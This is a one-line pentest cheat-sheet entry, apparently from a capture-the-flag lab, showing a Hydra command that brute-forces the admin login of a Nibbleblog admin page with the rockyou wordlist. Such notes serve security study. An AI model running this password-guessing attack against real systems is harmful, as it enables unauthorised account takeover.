
**HYDRA**

http-post-form:

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.26.24 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect username or password"`
